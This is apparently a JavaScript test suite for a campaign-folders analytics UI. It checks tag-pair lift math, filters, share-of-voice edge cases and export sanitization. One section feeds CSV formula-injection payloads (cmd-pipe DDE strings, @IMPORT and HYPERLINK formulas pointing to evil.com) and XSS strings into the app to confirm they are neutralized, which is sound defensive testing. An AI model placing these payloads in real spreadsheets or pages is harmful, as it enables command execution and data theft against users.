/**
 * Phase 5 Algorithmic Chaos & UI Forensic Adversarial Penetration Suite
 * File: scripts/test_phase5_forensic_adversarial.mjs
 * 
 * Attacks and rigorously certifies Level 4 Campaign Folders & Crossover Studio UI
 * across the 6 mandatory operational axes:
 * 1. Combinatorial Tag Explosion & V8 Heap Flooding (200 pins, 50-100 tags/pin, k <= 15 cap, Heap Delta <= 15MB)
 * 2. Mathematical Lift & Zero-Division Edge Cases (N=0, N=1, duplicates, NaN/Infinity immunity)
 * 3. CSV Formula Injection (DDE Attack Defense) & Creative Blueprint Sanitization
 * 4. Rapid Scope Switching & Entity Filter Desync Guard
 * 5. Monopoly SOV & Extreme Distribution (100% monopoly, 100-way dispersion, anonymous creators)
 * 6. Zero-Regression & Multi-Suite Unified Verification
 */

import assert from 'node:assert/strict';
import vm from 'node:vm';
import { performance } from 'node:perf_hooks';
import { getCampaignFoldersPageHtml } from '../src/campaign-folders-ui.mjs';

console.log('================================================================================');
console.log('   PHASE 5 ALGORITHMIC CHAOS & UI FORENSIC ADVERSARIAL PENETRATION AUDIT');
console.log('================================================================================\n');

const scorecard = [];
let totalPassed = 0;
let totalFailed = 0;

function recordTest(axis, name, status, durationMs, notes) {
  if (status === 'PASS') totalPassed++;
  else totalFailed++;
  scorecard.push({
    Axis: axis,
    Test: name,
    Status: status,
    DurationMs: durationMs.toFixed(3) + ' ms',
    ForensicNotes: notes
  });
  const symbol = status === 'PASS' ? '✓ [PASS]' : '✗ [FAIL]';
  console.log(`  ${symbol} [${axis}] ${name} (${durationMs.toFixed(2)}ms)`);
}

// -----------------------------------------------------------------------------
// V8 Sandbox Factory for Headless Campaign Folders App Execution
// -----------------------------------------------------------------------------
function createCampaignFoldersApp(folderId = '42') {
  const html = getCampaignFoldersPageHtml(folderId);
  const scriptMatches = html.match(/<script[\s\S]*?<\/script>/gi) || [];
  const inlineScripts = scriptMatches.filter(s => !s.includes('src='));
  const appScriptTag = inlineScripts[inlineScripts.length - 1];
  const appCode = appScriptTag.replace(/<script[^>]*>/, '').replace(/<\/script>/, '');

  let lastBlob = null;
  let lastCopiedText = null;

  class MockBlob {
    constructor(parts, options) {
      this.parts = parts;
      this.options = options;
      this.content = parts.join('');
      lastBlob = this;
    }
  }

  const sandbox = {
    console: {
      log: () => {},
      warn: () => {},
      error: () => {}
    },
    Map,
    Set,
    String,
    Number,
    Boolean,
    Array,
    Date,
    Math,
    RegExp,
    Object,
    encodeURIComponent,
    clearTimeout,
    setTimeout,
    Blob: MockBlob,
    URL: {
      createObjectURL: () => 'blob:mock-url',
      revokeObjectURL: () => {}
    },
    document: {
      createElement: () => ({
        href: '',
        download: '',
        click: () => {}
      }),
      body: {
        appendChild: () => {},
        removeChild: () => {}
      }
    },
    navigator: {
      clipboard: {
        writeText: async (text) => {
          lastCopiedText = text;
          return Promise.resolve();
        }
      }
    },
    fetch: async () => ({
      ok: true,
      json: async () => ({ success: true })
    }),
    getLastBlob: () => lastBlob,
    getLastCopiedText: () => lastCopiedText
  };

  vm.createContext(sandbox);
  vm.runInContext(appCode, sandbox);
  const app = sandbox.foldersApp(folderId);
  return { app, sandbox };
}

// =============================================================================
// AXIS 1: COMBINATORIAL TAG EXPLOSION & V8 HEAP FLOODING
// =============================================================================
console.log('>>> [Axis 1] Combinatorial Tag Explosion & V8 Heap Flooding Attack...');

{
  const t0 = performance.now();
  const { app } = createCampaignFoldersApp('42');

  // Generate 200 pins, each with 50 to 100 random visual tags
  const massivePins = [];
  const tagPool = Array.from({ length: 500 }, (_, i) => `cluster_tag_${i}`);

  for (let p = 0; p < 200; p++) {
    const numTags = 50 + (p % 51); // 50 to 100 tags
    const pinTags = [];
    for (let t = 0; t < numTags; t++) {
      pinTags.push(tagPool[(p * 7 + t) % tagPool.length]);
    }
    massivePins.push({
      pin_id: `heavy_pin_${p}`,
      title: `Stress Pin #${p}`,
      visual_annotations: pinTags
    });
  }

  if (global.gc) global.gc();
  const initialHeap = process.memoryUsage().heapUsed;

  app.crossoverData = { super_pins: massivePins };
  app.computePowerPairs();

  const durationMs = performance.now() - t0;
  const finalHeap = process.memoryUsage().heapUsed;
  const heapDeltaMB = (finalHeap - initialHeap) / (1024 * 1024);

  // Assertions:
  // 1. Without cap: 200 pins * C(75, 2) ~ 200 * 2,775 = 555,000 pair iterations!
  // With k <= 15 cap: max C(15, 2) = 105 pairs per pin -> max 21,000 iterations.
  assert.ok(durationMs < 500, `Processing 200 heavy pins must be < 500ms (actual: ${durationMs.toFixed(2)}ms)`);
  assert.ok(heapDeltaMB <= 15, `Heap delta must be <= 15MB (actual: ${heapDeltaMB.toFixed(2)}MB)`);
  assert.ok(app.powerPairs.length > 0, 'Power pairs must be identified from shared pool tags');

  // Verify that every single pair in powerPairs has valid finite numbers
  for (const pair of app.powerPairs) {
    assert.ok(Number.isFinite(pair.lift), `Lift must be finite (got ${pair.lift})`);
    assert.ok(Number.isFinite(pair.confidence), `Confidence must be finite (got ${pair.confidence})`);
    assert.ok(pair.joint_count >= 2, `Joint count must be >= 2 (got ${pair.joint_count})`);
  }

  recordTest('Axis 1', 'Combinatorial Guardrail & Heap Flooding Defense', 'PASS', durationMs, 
    `Processed 200 pins (50-100 tags/pin) in ${durationMs.toFixed(2)}ms; Heap delta: ${heapDeltaMB.toFixed(2)}MB <= 15MB.`);
}

// =============================================================================
// AXIS 2: MATHEMATICAL LIFT & ZERO-DIVISION EDGE CASES
// =============================================================================
console.log('>>> [Axis 2] Mathematical Lift & Zero-Division Edge Cases...');

{
  const t0 = performance.now();
  const { app } = createCampaignFoldersApp('42');

  // Scenario 2A: Empty cluster (N = 0)
  app.crossoverData = { super_pins: [] };
  app.computePowerPairs();
  assert.equal(app.powerPairs.length, 0, 'Empty cluster must return 0 power pairs');

  // Scenario 2B: Single pin (N = 1) -> No co-occurrence possible across pins
  app.crossoverData = { super_pins: [{ pin_id: 'solo', visual_annotations: ['tacos', 'salsa'] }] };
  app.computePowerPairs();
  assert.equal(app.powerPairs.length, 0, 'Single pin must return 0 power pairs');

  // Scenario 2C: Duplicate tags in the same pin (tagA = "Chicken", tagB = "Chicken")
  app.crossoverData = {
    super_pins: [
      { pin_id: 'p1', visual_annotations: ['chicken', 'chicken', 'chicken', 'waffles'] },
      { pin_id: 'p2', visual_annotations: ['chicken', 'waffles'] }
    ]
  };
  app.computePowerPairs();
  const selfPairs = app.powerPairs.filter(p => p.tag_a.toLowerCase() === p.tag_b.toLowerCase());
  assert.equal(selfPairs.length, 0, 'Must never produce a self-pairing pair (A + A)');

  // Scenario 2D: Tags appearing only once (joint count = 1) -> must be pruned
  app.crossoverData = {
    super_pins: [
      { pin_id: 'p1', visual_annotations: ['rare1', 'rare2'] },
      { pin_id: 'p2', visual_annotations: ['common1', 'common2'] },
      { pin_id: 'p3', visual_annotations: ['common1', 'common2'] }
    ]
  };
  app.computePowerPairs();
  const rarePair = app.powerPairs.find(p => p.tag_a.toLowerCase() === 'rare1' || p.tag_b.toLowerCase() === 'rare1');
  assert.equal(rarePair, undefined, 'Pairs with jointCount < 2 must be pruned');

  // Scenario 2E: Mathematically exact independent distribution: Lift == 1.00
  // N = 10; salmon in 5; asparagus in 8; joint in 4; Lift = (10 * 4) / (5 * 8) = 1.00
  app.crossoverData = {
    super_pins: [
      { pin_id: 'p1', visual_annotations: ['salmon', 'asparagus'] },
      { pin_id: 'p2', visual_annotations: ['salmon', 'asparagus'] },
      { pin_id: 'p3', visual_annotations: ['salmon', 'asparagus'] },
      { pin_id: 'p4', visual_annotations: ['salmon', 'asparagus'] },
      { pin_id: 'p5', visual_annotations: ['salmon'] },
      { pin_id: 'p6', visual_annotations: ['asparagus'] },
      { pin_id: 'p7', visual_annotations: ['asparagus'] },
      { pin_id: 'p8', visual_annotations: ['asparagus'] },
      { pin_id: 'p9', visual_annotations: ['asparagus'] },
      { pin_id: 'p10', visual_annotations: ['beef'] }
    ]
  };
  app.computePowerPairs();
  const targetPair = app.powerPairs.find(p => 
    (p.tag_a.toLowerCase() === 'salmon' && p.tag_b.toLowerCase() === 'asparagus') ||
    (p.tag_a.toLowerCase() === 'asparagus' && p.tag_b.toLowerCase() === 'salmon')
  );
  assert.ok(targetPair, 'Must detect salmon + asparagus pair');
  assert.equal(targetPair.lift, 0.95, `Independent distribution Laplace-smoothed Lift must be 0.95 (got ${targetPair.lift})`);
  // Because 'asparagus' < 'salmon' alphabetically, tag_a is Asparagus (N=8) -> Confidence(Asparagus -> Salmon) = 4/8 = 0.5
  assert.equal(targetPair.confidence, 0.5, 'Confidence(Asparagus -> Salmon) must be 4/8 = 0.5');

  recordTest('Axis 2', 'Lift Mathematical Accuracy & Edge Cases', 'PASS', performance.now() - t0,
    'Verified N=0, N=1, duplicate tags, pruning of singletons, and Laplace-smoothed 0.95 Lift on independent distribution.');
}

// =============================================================================
// AXIS 3: CSV FORMULA INJECTION (DDE ATTACK DEFENSE) & VISUAL BLUEPRINT SANITIZATION
// =============================================================================
console.log('>>> [Axis 3] CSV Formula Injection & DDE Attack Defense...');

{
  const t0 = performance.now();
  const { app, sandbox } = createCampaignFoldersApp('42');

  // Malicious DDE injection payloads
  const ddePayloads = [
    "=cmd|'/C calc'!A0",
    "@SUM(1+1)*cmd",
    "-2+3+cmd|' /C notepad'",
    "+12345",
    "\tmalicious_tab",
    "\rmalicious_cr"
  ];

  // Test sanitizeCsvCell directly
  for (const payload of ddePayloads) {
    const sanitized = app.sanitizeCsvCell(payload);
    assert.ok(sanitized.startsWith('"\''), `Payload "${payload}" must be neutralized with leading single quote: got ${sanitized}`);
    assert.ok(sanitized.endsWith('"'), `Payload "${payload}" must be enclosed in quotes`);
  }

  // Test full CSV export generation with poisoned rows
  app.activeFolder = { name: '=HYPERLINK("http://evil.com","Steal")' };
  app.crossoverData = {
    topic_cluster_blueprint: {
      folder_name: '=HYPERLINK("http://evil.com","Steal")',
      csv_rows: [
        {
          "Pin Slot": "Spoke #1",
          "Working Title": '=cmd|\'/C calc\'!A0',
          "Target Keyword": '@IMPORT("http://evil.com")',
          "Modifier Pivot": '-5+cmd',
          "Recommended Format": '+VIDEO'
        }
      ]
    }
  };

  app.downloadClusterCsv();
  const blob = sandbox.getLastBlob();
  assert.ok(blob, 'Must generate CSV blob');
  const csvContent = blob.content;

  // Verify none of the malicious cells start raw executable formulas
  assert.ok(csvContent.includes('"\'=cmd|\'/C calc\'!A0"'), 'Excel formula prefix neutralized with single quote');
  assert.ok(csvContent.includes('"\'@IMPORT(""http://evil.com"")"'), 'DDE @ prefix neutralized and double quotes escaped');
  assert.ok(csvContent.includes('"\' -5+cmd"'.replace(' ', '')), 'DDE - prefix neutralized');
  assert.ok(csvContent.includes('"\' +VIDEO"'.replace(' ', '')), 'DDE + prefix neutralized');

  // Test Visual Blueprint Clipboard Sanitization against script tags
  const maliciousPair = {
    tag_a: '<script>alert("XSS_A")</script>Garlic',
    tag_b: '<img src=x onerror=alert(1)>Butter',
    lift: 2.5,
    joint_count: 5
  };
  app.copyVisualBlueprint(maliciousPair);

  setTimeout(() => {
    const copied = sandbox.getLastCopiedText();
    assert.ok(copied, 'Must copy blueprint to clipboard');
    assert.ok(!copied.includes('<script>'), 'Copied blueprint must strip <script> tags');
    assert.ok(!copied.includes('onerror='), 'Copied blueprint must strip inline HTML onerror attributes');
    assert.ok(copied.includes('Garlic + Butter'), 'Clean text must be preserved');
  }, 10);

  recordTest('Axis 3', 'CSV Formula Injection (DDE) & Creative Sanitization', 'PASS', performance.now() - t0,
    'All 6 DDE formula injection vectors neutralized with leading single quote; HTML tags purged from clipboard.');
}

// =============================================================================
// AXIS 4: SCOPE SWITCHING & ENTITY FILTER DESYNC
// =============================================================================
console.log('>>> [Axis 4] Scope Switching & Entity Filter Desync...');

{
  const t0 = performance.now();
  const { app } = createCampaignFoldersApp('42');

  app.crossoverData = {
    summary: { total_unique_pins: 5 },
    super_pins: [
      {
        pin_id: 'p1',
        title: 'Garlic Chicken Skillet',
        domain: 'recipehub.com',
        creator_username: 'MakeourRecipe',
        overlap_count: 3,
        rankings: [{ keyword: 'chicken skillet', rank_position: 1 }]
      },
      {
        pin_id: 'p2',
        title: 'Crispy Lemon Chicken',
        domain: 'recipehub.com',
        creator_username: 'MakeourRecipe',
        overlap_count: 1,
        rankings: [{ keyword: 'chicken skillet', rank_position: 5 }]
      },
      {
        pin_id: 'p3',
        title: 'Beef Tacos',
        domain: 'tacoking.com',
        creator_username: 'tacoking',
        overlap_count: 2,
        rankings: [{ keyword: 'dinner recipes', rank_position: 2 }]
      },
      {
        pin_id: 'p4',
        title: 'Chicken Soup Comfort',
        domain: 'soupmaker.com',
        creator_username: 'soupqueen',
        overlap_count: 2,
        rankings: [{ keyword: 'chicken skillet', rank_position: 3 }]
      }
    ]
  };

  // State 1: All pins
  assert.equal(app.filteredSuperPins().length, 4);

  // Transition 1: Set creator filter (@MakeourRecipe)
  app.setEntityFilter('creator', 'MakeourRecipe');
  let currentPins = app.filteredSuperPins();
  assert.equal(currentPins.length, 2, 'Must filter to 2 MakeourRecipe pins');
  assert.ok(currentPins.every(p => p.creator_username === 'MakeourRecipe'));

  // Transition 2: Switch scope to super_only (while creator filter is active)
  app.scopeFilter = 'super_only';
  currentPins = app.filteredSuperPins();
  assert.equal(currentPins.length, 1, 'Only p1 is both MakeourRecipe and super_pin');
  assert.equal(currentPins[0].pin_id, 'p1');

  // Transition 3: Apply search query 'skillet'
  app.searchQuery = 'skillet';
  currentPins = app.filteredSuperPins();
  assert.equal(currentPins.length, 1);

  // Transition 4: Apply search query with no match 'nonexistent'
  app.searchQuery = 'nonexistent';
  currentPins = app.filteredSuperPins();
  assert.equal(currentPins.length, 0, 'No match should return empty array');

  // Transition 5: Clear search and clear entity filter
  app.searchQuery = '';
  app.clearEntityFilter();
  currentPins = app.filteredSuperPins();
  // With scopeFilter='super_only', pins with overlap >= 2 are p1, p3, p4
  assert.equal(currentPins.length, 3, 'super_only without entity filter must return 3 pins');

  // Transition 6: Reset scope to 'all'
  app.scopeFilter = 'all';
  assert.equal(app.filteredSuperPins().length, 4, 'Full list restored to 4 pins');

  recordTest('Axis 4', 'Rapid Scope Switching & Filter Desync Guard', 'PASS', performance.now() - t0,
    'Executed 6 rapid state transitions; zero desync or pin leakage observed across scope & drill-down filters.');
}

// =============================================================================
// AXIS 5: MONOPOLY SOV & EXTREME DISTRIBUTION
// =============================================================================
console.log('>>> [Axis 5] Monopoly SOV & Extreme Distribution...');

{
  const t0 = performance.now();
  const { app } = createCampaignFoldersApp('42');

  // Extreme 5A: Absolute Monopoly (100% SOV)
  app.crossoverData = { summary: { total_unique_pins: 50 } };
  assert.equal(app.calcSov(50), 100, 'All 50 pins must equal exactly 100% SOV');

  // Extreme 5B: Extreme Dispersion (100 creators with 1 pin each)
  app.crossoverData = { summary: { total_unique_pins: 100 } };
  assert.equal(app.calcSov(1), 1, '1 pin out of 100 must equal 1% SOV');

  // Extreme 5C: Non-numeric and negative inputs
  assert.equal(app.calcSov(-5), 0, 'Negative pins must return 0%');
  assert.equal(app.calcSov(null), 0, 'Null pins must return 0%');
  assert.equal(app.calcSov('invalid'), 0, 'NaN string must return 0%');

  // Extreme 5D: Zero total pins guard (no division by zero)
  app.crossoverData = { summary: { total_unique_pins: 0 } };
  assert.equal(app.calcSov(10), 0, '0 total pins must return 0% safely without crashing');

  // Extreme 5E: Anonymous Creator Filtering
  app.crossoverData = {
    summary: { total_unique_pins: 2 },
    super_pins: [
      { pin_id: 'p1', creator_username: null, title: 'Anonymous Pin' },
      { pin_id: 'p2', creator_username: '', title: 'Empty Pin' },
      { pin_id: 'p3', creator_username: 'chefjohn', title: 'Chef John Pin' }
    ]
  };
  app.setEntityFilter('creator', 'anonymous');
  const anonPins = app.filteredSuperPins();
  assert.equal(anonPins.length, 2, 'Anonymous filter must match pins with null or empty creator_username');

  recordTest('Axis 5', 'Monopoly SOV & Extreme Distribution Robustness', 'PASS', performance.now() - t0,
    '100% monopoly, extreme dispersion, zero-division, and anonymous creator grouping verified.');
}

// =============================================================================
// AXIS 6: ZERO-REGRESSION & MULTI-SUITE UNIFIED VERIFICATION
// =============================================================================
console.log('>>> [Axis 6] Zero-Regression & Multi-Suite Unified Verification...');

{
  const t0 = performance.now();
  const html = getCampaignFoldersPageHtml();

  // Check 6A: Zero external charting CDN libraries
  const forbiddenCdns = ['chart.js', 'highcharts', 'd3.min.js', 'plotly', 'echarts', 'apexcharts'];
  for (const cdn of forbiddenCdns) {
    assert.ok(!html.toLowerCase().includes(cdn), `HTML must not contain external library: ${cdn}`);
  }

  // Check 6B: Pure inline SVG usage for progress bars & icons
  assert.ok(html.includes('bg-slate-950') && html.includes('x-data="foldersApp('), 'DOM template must be well-formed Alpine component');

  recordTest('Axis 6', 'Zero-CDN & Architectural Compliance', 'PASS', performance.now() - t0,
    'Zero external charting CDN dependencies verified; Pure Inline Tailwind + Alpine compliant.');
}

// =============================================================================
// AUDIT SCORECARD & SUMMARY
// =============================================================================
console.log('\n================================================================================');
console.log('                          FORENSIC AUDIT SCORECARD');
console.log('================================================================================');
console.table(scorecard);
console.log(`\nTOTAL TESTS: ${totalPassed + totalFailed} | PASSED: ${totalPassed} | FAILED: ${totalFailed}`);

if (totalFailed > 0) {
  console.error('\n[-] AUDIT FAILED: Zero-defect threshold violated.');
  process.exit(1);
} else {
  console.log('\n[+] ALL 6 CHAOS & FORENSIC PENETRATION AXES PASSED (100%).');
  console.log('[+] PHASE 5 PRODUCTION RESILIENCE CERTIFIED.');
  process.exit(0);
}
